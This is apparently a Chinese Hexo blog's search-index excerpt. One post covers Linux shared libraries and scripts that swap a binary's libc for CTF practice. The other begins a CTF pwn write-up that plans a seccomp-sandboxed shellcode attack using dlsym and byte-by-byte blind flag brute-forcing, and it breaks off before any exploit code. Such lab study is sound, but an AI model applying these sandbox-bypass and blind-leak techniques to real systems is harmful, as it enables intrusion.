      <link href="2020/11/30/linux%E5%BA%93%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
      <url>2020/11/30/linux%E5%BA%93%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在ctf中共享库的问题一直是一个<strong>非常非常非常</strong>恶心的问题，这里将会介绍动态链接库的命名以及如何修改一个程序依赖的动态链接库</p><h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><pre><code>0x7f387805e000     0x7f3878091000 r-xp    33000 0      /lib/x86_64-linux-gnu/libseccomp.so.2.4.3</code></pre><ul><li>lib表示库文件</li><li>so表示动态链接</li><li>2.4.3中2表示主本号，4表示次版本，3表示发布版本</li></ul><p>主版本是重大升级，不会向上兼容（如python2和3）<br>次版本是增量升级，添加一些新的接口<br>发布版本是进行一些错误修正，性能改进等</p><h2 id="SO-NAME命名与软链接"><a href="#SO-NAME命名与软链接" class="headerlink" title="SO-NAME命名与软链接"></a>SO-NAME命名与软链接</h2><p>用SO-NAME机制来记录共享库的依赖关系</p><p>每个库都有自己的SO-NAME知名库名字和主版本号如libc.so.2</p><p>SO-NAME相同的两个次版本号不同的库，次版本号大的兼容小的</p><p>在linux系统中，系统会为每个共享库在它所在的目录创建一个跟SO-NAME相同并且指向它的软连接如系统中存在共享库<code>/lib/libfoo.so.2.6.1</code>那么linux共享库管理程序会为它创建一个指向它的软链接<code>/lib/libfoo.so.2</code></p><p>也有一些不标准的命名，如libc.so.6 还有ld-2.6.1.so被命名为ld-linux.so</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606739812533.png" alt="libc.so.6"></p><h3 id="SO-NAME的好处"><a href="#SO-NAME的好处" class="headerlink" title="SO-NAME的好处"></a>SO-NAME的好处</h3><ul><li>每个最新的库覆盖掉旧的，保持在主版本号内最新</li><li>可执行文件pwn如果依赖于libc.2.23.so会在.dynamic段DT_NEED字段写入libc.so.6写入SO-NAME可以避免库更新之后不能运行</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606741196566.png" alt="NEEDED字段"></p><h2 id="编译时链接"><a href="#编译时链接" class="headerlink" title="编译时链接"></a>编译时链接</h2><p>在运行时需要链接一个程序可以加 <code>-lxxx</code>，如<code>-lpthread</code>编译器会根据当前环境在系统中的相关路径查找最新版本的库一般用<code>-L</code>指定搜索路径</p><p>对于链接方式分为动态和静态链接在ld使用<code>-static</code>选项时会搜索静态链接库（如libc.a.2.23）默认是动态</p><h2 id="共享库的路径"><a href="#共享库的路径" class="headerlink" title="共享库的路径"></a>共享库的路径</h2><ul><li>/lib存放系统最关键的共享库，一般是/bin,/sbin目录下程序需要的库还有系统启动时需要的库</li><li>/usr/lib开发时可能用到的库</li><li>/usr/local/lib跟操作系统本身不十分相关的库，一些第三方软件安装的库</li></ul><h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><p>如果DT_NEED存放绝对路径就从这个路径找</p><p>如果没有会在/lib,/usr/lib由 /etc/ld.so.conf配置文件指定的目录中查找共享库。</p><p>为了加快遍历速度，有一个叫ldconfig的程序各个共享库创建删除或更新相应的SO-NAME，把这些SO-NAME集中起来放到<code>/etc/ld.so.cache</code></p><p><strong>所以正常更新或替换共享库需要运行一次ldconfig</strong></p><h2 id="共享库创建和安装"><a href="#共享库创建和安装" class="headerlink" title="共享库创建和安装"></a>共享库创建和安装</h2><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><code>-share</code>选项表示输出结果是共享库类型</p><p><code>-Wl</code>选项可以传递给连接器选项   <code>-Wl,-soname,my_soname</code>可以指定SO-NAME（如果不指定这个库就没有soname，用ldconfig也没用）</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>包含两步1.创建SO-NAME软连接。 2.告诉编译器和程序如何查找共享库</p><ul><li>把共享库复制到/lib或者/usr/lib等然后运行ldconfig</li><li><code>ldconfig -n shared_library_directory</code> 在编译程序时提供<code>-L</code>和<code>-l</code>  LD_LIBRARY_PATH也可以用来指定</li></ul><h2 id="共享库替换"><a href="#共享库替换" class="headerlink" title="共享库替换"></a>共享库替换</h2><h3 id="修改环境变量替换"><a href="#修改环境变量替换" class="headerlink" title="修改环境变量替换"></a>修改环境变量替换</h3><p><strong>LD_LIBRARY_PATH</strong>  临时改变某个应用程序的共享库查找路径而不会影响系统中其他程序<br>类似于<code>/lib/ld-linux.so.2 -binary-path /home/user /bin/ls</code>。</p><p><strong>LD_PRELOAD</strong>优先级更高，无论程序是否依赖动态库，被指定的动态库都会被加载  </p><p>系统将会从下面搜索库</p><ul><li>LD_PRELOAD</li><li>LD_LIBRARY_PATH指定的路径</li><li>/etc/ld.so.cache指定的路径</li><li>默认共享目录，/usr/lib      /lib等</li></ul><h3 id="修改二进制文件更改libc版本"><a href="#修改二进制文件更改libc版本" class="headerlink" title="修改二进制文件更改libc版本"></a>修改二进制文件更改libc版本</h3><p>有一个项目可以下载很多版本的libc<br><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><pre class=" language-bash"><code class="language-bash">➜  <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git➜  glibc-all-in-one ./update_list➜  glibc-all-in-one <span class="token function">cat</span> list  可以看到获取到的库名字➜  glibc-all-in-one ./download 2.23-0ubuntu10_i386  后面的库名字是上一条命令看到的任意一个</code></pre><p>然后需要创建目录，拷贝文件到对应目录</p><pre class=" language-bash"><code class="language-bash">➜  glibc-all-in-one sduo <span class="token function">mkdir</span> -p /glibc/2.27/64/lib/➜  glibc-all-in-one <span class="token function">sudo</span> <span class="token function">cp</span> ./libs/2.27-3ubuntu1.2_amd64/* /glibc/2.27/64/lib</code></pre><p>为了完成上面的操作写了一个简单的脚本，完成更新列表，下载库，拷贝的过程</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"./download {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mkDir</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> name<span class="token punctuation">:</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo mkdir -p /glibc/{}/64/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo mkdir -p /glibc/{}/32/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>        <span class="token keyword">if</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> name <span class="token operator">or</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">""</span> <span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    <span class="token keyword">return</span> nameos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"./update_list"</span><span class="token punctuation">)</span>f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"./list"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>LibcNameList<span class="token operator">=</span>content<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>name<span class="token operator">=</span>getName<span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span>mkDir<span class="token punctuation">(</span>name<span class="token punctuation">)</span>download<span class="token punctuation">(</span>LibcNameList<span class="token punctuation">)</span><span class="token keyword">for</span> LibcName <span class="token keyword">in</span> LibcNameList<span class="token punctuation">:</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> name<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token keyword">in</span>  LibcName<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token string">"amd64"</span> <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo cp ./libs/{}/* /glibc/{}/64/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>LibcName<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token string">"i386"</span> <span class="token keyword">in</span> LibcName<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo cp ./libs/{}/* /glibc/{}/32/lib/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>LibcName<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="修改二进制文件clibc"><a href="#修改二进制文件clibc" class="headerlink" title="修改二进制文件clibc"></a>修改二进制文件clibc</h4><p>clibc</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>FILE_NAME<span class="token operator">=</span><span class="token variable">$1</span>LIBC_VERSION<span class="token operator">=</span><span class="token variable">$2</span>WORKDIR<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">pwd</span><span class="token variable">)</span></span>LIBC_DIR<span class="token operator">=</span>/glibcLIBC_DIR<span class="token operator">=</span><span class="token punctuation">$(</span>find <span class="token variable">$LIBC_DIR</span> -name <span class="token string">"<span class="token variable">$LIBC_VERSION*</span>"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$LIBC_DIR</span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Not support version or your <span class="token variable">$LIBC_DIR</span> don't have libc"</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span>EBIT<span class="token operator">=</span><span class="token punctuation">$(</span>file <span class="token variable">$FILE_NAME</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print<span class="token variable">$3</span>}'</span><span class="token operator">|</span><span class="token function">cut</span> -c 1-2<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$EBIT</span> -eq <span class="token string">"32"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    libc_dir<span class="token operator">=</span><span class="token variable">$LIBC_DIR</span>/32/lib<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$EBIT</span> -eq <span class="token string">"64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    libc_dir<span class="token operator">=</span><span class="token variable">$LIBC_DIR</span>/64/lib<span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"It's not a elf file"</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token keyword">if</span>  <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$3</span>"</span> <span class="token punctuation">]</span> <span class="token keyword">then</span>    patchelf --set-interpreter <span class="token variable">$libc_dir</span>/ld-<span class="token variable">$LIBC_VERSION</span>.so --set-rpath <span class="token variable">$WORKDIR</span>/ <span class="token variable">$1</span><span class="token keyword">else</span>    patchelf --set-interpreter <span class="token variable">$libc_dir</span>/ld-<span class="token variable">$LIBC_VERSION</span>.so --set-rpath <span class="token variable">$libc_dir</span>/ <span class="token variable">$1</span><span class="token keyword">fi</span><span class="token keyword">echo</span> <span class="token string">"success!!!"</span></code></pre><pre class=" language-bash"><code class="language-bash">clibc filename 2.23</code></pre><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606830240030.png" alt="修改二进制文件"></p><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606829048602.png" alt="测试结果"></p><p>上图可以看到用clibc修改之后(左图)和Ubuntu16自带的libc2.23加载空间没有什么区别<br><strong>注：图中看到的ld-2.23.so是链接器</strong></p><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/tower111/pwn-change-libc">https://github.com/tower111/pwn-change-libc</a></p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 介绍 </tag>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cscctf_2019_final_maps</title>
      <link href="2020/11/29/cscctf_2019_final_maps/"/>
      <url>2020/11/29/cscctf_2019_final_maps/</url>
      
        <content type="html"><![CDATA[<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>源码很简单，直接贴出</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// local variable allocation has failed, the output may be wrong!</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">unsigned</span> __int64 buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"/home/maps/libflag.so"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//打开文件夹</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v8 <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"dlopen"</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span>                            <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>buf <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span>                                   <span class="token operator">-</span> <span class="token number">0x777700000000LL</span>                                   <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x224946DBB2496LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>buf <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0x1000uLL</span><span class="token punctuation">,</span>                            <span class="token number">7</span><span class="token punctuation">,</span>                            <span class="token number">34</span><span class="token punctuation">,</span>                            <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>                            <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span>                           <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v7 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span>                                  <span class="token operator">-</span> <span class="token number">131352984813568LL</span>                                  <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x224946DBB2496LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v7 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                           <span class="token number">0x1000uLL</span><span class="token punctuation">,</span>                           <span class="token number">3</span><span class="token punctuation">,</span>                           <span class="token number">34</span><span class="token punctuation">,</span>                           <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>                           <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>buf <span class="token operator">||</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">,</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your flag is hid inside libflag.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's see what your shellcode can do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3B8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">init_seccomp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">2048</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>打开一个动态链接库，里面应该有system函数。</p><p>然后用mmap创建空间，地址随机。</p><p>sc处的指令用来设置栈为输入的地址</p><pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> x <span class="token operator">/</span>50i <span class="token number">0x400f00</span>     <span class="token number">0x400f00</span> <span class="token operator">&lt;</span>sc<span class="token operator">></span><span class="token punctuation">:</span>       mov    rsp<span class="token punctuation">,</span>rdi   <span class="token number">0x400f03</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">3</span><span class="token operator">></span><span class="token punctuation">:</span>     xor    rax<span class="token punctuation">,</span>rax   <span class="token number">0x400f06</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token punctuation">:</span>     xor    rbx<span class="token punctuation">,</span>rbx   <span class="token number">0x400f09</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token punctuation">:</span>     xor    rcx<span class="token punctuation">,</span>rcx   <span class="token number">0x400f0c</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    rdx<span class="token punctuation">,</span>rdx   <span class="token number">0x400f0f</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    rdi<span class="token punctuation">,</span>rdi   <span class="token number">0x400f12</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    rsi<span class="token punctuation">,</span>rsi   <span class="token number">0x400f15</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">21</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    rbp<span class="token punctuation">,</span>rbp   <span class="token number">0x400f18</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r8<span class="token punctuation">,</span>r8   <span class="token number">0x400f1b</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r9<span class="token punctuation">,</span>r9   <span class="token number">0x400f1e</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r10<span class="token punctuation">,</span>r10   <span class="token number">0x400f21</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">33</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r11<span class="token punctuation">,</span>r11   <span class="token number">0x400f24</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r12<span class="token punctuation">,</span>r12   <span class="token number">0x400f27</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r13<span class="token punctuation">,</span>r13   <span class="token number">0x400f2a</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">42</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r14<span class="token punctuation">,</span>r14   <span class="token number">0x400f2d</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">45</span><span class="token operator">></span><span class="token punctuation">:</span>    xor    r15<span class="token punctuation">,</span>r15   <span class="token number">0x400f30</span> <span class="token operator">&lt;</span>sc<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">:</span>    add    BYTE PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span>al</code></pre><p>接下来要执行的代码从输入获取。中间禁用了所有系统调用，只能用exit</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>用dlsym函数把需要的函数加载然后调用。</p><p>调用结果不能输出，可以用一位一位爆破的方法，如果匹配相同可以陷入死循环接收不到东西但不会断开。如果匹配不相同可以直接结束会接收到EOF</p><h3 id="dlsym函数"><a href="#dlsym函数" class="headerlink" title="dlsym函数"></a>dlsym函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">dlsym</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>handle<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>symbol<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第一个参数handle是dlopen的返回值，是文件的句柄，一个堆地址</p><p>第二个参数是符号是要调用函数名字是个字符串</p><p>返回一个被调用函数或符号的真实地址</p><h3 id="link-map结构"><a href="#link-map结构" class="headerlink" title="link_map结构"></a>link_map结构</h3><p>上一部分中说到文件句柄，这里说如何找到这个地址</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606728261819.png" alt="plt表在内存中的位置"></p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606728337811.png" alt="ida中plt表的位置"></p><p>plt表的第二项是link_map的地址，link_map是一个链表，每个节点是一个结构体，每个节点存放一个动态库的信息。</p><p>结构为，其中每个节点的地址就是上文说道的句柄的地址</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> 